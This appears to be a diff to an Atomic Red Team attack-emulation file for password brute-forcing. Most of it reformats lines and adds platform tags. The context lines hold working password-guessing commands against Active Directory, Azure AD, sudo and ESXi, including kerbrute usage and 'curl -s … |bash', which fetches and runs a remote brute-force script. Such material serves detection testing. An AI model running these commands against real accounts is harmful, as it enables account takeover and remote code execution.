@@ -21,8 +21,10 @@ atomic_tests:
       echo Spring2022>> passwords.txt
       echo ChangeMe!>> passwords.txt
       @FOR /F "delims=" %p in (passwords.txt) DO @net use %logonserver%\IPC$ /user:"%userdomain%\#{user}" "%p" 1>NUL 2>&1 && @echo [*] #{user}:%p && @net use /delete %logonserver%\IPC$ > NUL
-
-- name: Brute Force Credentials of single Active Directory domain user via LDAP against domain controller (NTLM or Kerberos)
+  run_on:
+  - windows
+- name: Brute Force Credentials of single Active Directory domain user via LDAP against
+    domain controller (NTLM or Kerberos)
   auto_generated_guid: c2969434-672b-4ec8-8df0-bbb91f40e250
   description: |
     Attempt to brute force Active Directory domain user on a domain controller, via LDAP, with NTLM or Kerberos
@@ -71,7 +73,8 @@ atomic_tests:
         }
       }
       Write-Host "End of bruteforce"
-
+  run_on:
+  - windows
 - name: Brute Force Credentials of single Azure AD user
   auto_generated_guid: 5a51ef57-299e-4d62-8e11-2d440df55e69
   description: |
@@ -80,7 +83,8 @@ atomic_tests:
   - azure-ad
   input_arguments:
     username:
-      description: Account to bruteforce. We encourage users running this atomic to add a valid microsoft account domain; for eg "bruce.wayne@<valid_ms_account.com>"
+      description: Account to bruteforce. We encourage users running this atomic to
+        add a valid microsoft account domain; for eg "bruce.wayne@<valid_ms_account.com>"
       type: string
       default: bruce.wayne@contoso.com
     passwords:
@@ -116,7 +120,8 @@ atomic_tests:
         }
       }
       Write-Host "End of bruteforce"
-
+  run_on:
+  - azure-ad
 - name: Password Brute User using Kerbrute Tool
   auto_generated_guid: 59dbeb1a-79a7-4c2a-baf4-46d0f4c761c4
   description: |
@@ -154,7 +159,8 @@ atomic_tests:
     command: |
       cd "PathToAtomicsFolder\..\ExternalPayloads"
       .\kerbrute.exe bruteuser --dc #{domaincontroller} -d #{domain} $env:temp\bruteuser.txt TestUser1 
-
+  run_on:
+  - windows
 - name: SUDO Brute Force - Debian
   auto_generated_guid: ba1bf0b6-f32b-4db0-b7cc-d78cacc76700
   description: |
@@ -167,7 +173,8 @@ atomic_tests:
     remote_url:
       description: url of remote payload
       type: url
-      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1110.001/src/sudo_bruteforce.sh
+      default: 
+        https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1110.001/src/sudo_bruteforce.sh
   dependency_executor_name: bash
   dependencies:
   - description: |
@@ -190,7 +197,8 @@ atomic_tests:
       curl -s #{remote_url} |bash
     cleanup_command: |
       userdel -fr art
-
+  run_on:
+  - linux
 - name: SUDO Brute Force - Redhat
   auto_generated_guid: 4097bc00-5eeb-4d56-aaf9-287d60351d95
   description: |
@@ -203,7 +211,8 @@ atomic_tests:
     remote_url:
       description: url of remote payload
       type: url
-      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1110.001/src/sudo_bruteforce.sh
+      default: 
+        https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1110.001/src/sudo_bruteforce.sh
   dependency_executor_name: bash
   dependencies:
   - description: |
@@ -226,7 +235,8 @@ atomic_tests:
       curl -s #{remote_url} |bash
     cleanup_command: |
       userdel -fr art
-
+  run_on:
+  - linux
 - name: SUDO Brute Force - FreeBSD
   auto_generated_guid: abcde488-e083-4ee7-bc85-a5684edd7541
   description: |
@@ -239,7 +249,8 @@ atomic_tests:
     remote_url:
       description: url of remote payload
       type: url
-      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1110.001/src/sudo_bruteforce.sh
+      default: 
+        https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1110.001/src/sudo_bruteforce.sh
   dependency_executor_name: sh
   dependencies:
   - description: |
@@ -263,6 +274,8 @@ atomic_tests:
       curl -s #{remote_url} |bash
     cleanup_command: |
       rmuser -y art
+  run_on:
+  - freebsd
 - name: ESXi - Brute Force Until Account Lockout
   auto_generated_guid: f0b443ae-9565-11ee-b9d1-0242ac120002
   description: |
@@ -278,11 +291,12 @@ atomic_tests:
     plink_file:
       description: Path to Putty
       type: path
-      default: 'PathToAtomicsFolder\..\ExternalPayloads\plink.exe'
+      default: PathToAtomicsFolder\..\ExternalPayloads\plink.exe
     lockout_threshold:
-      description: Specify the account lockout threshold configured on the ESXI management server
+      description: Specify the account lockout threshold configured on the ESXI management
+        server
       type: string
-      default: "5"
+      default: '5'
   dependency_executor_name: powershell
   dependencies:
   - description: |
@@ -300,3 +314,5 @@ atomic_tests:
         }
     name: powershell
     elevation_required: false
+  run_on:
+  - windows
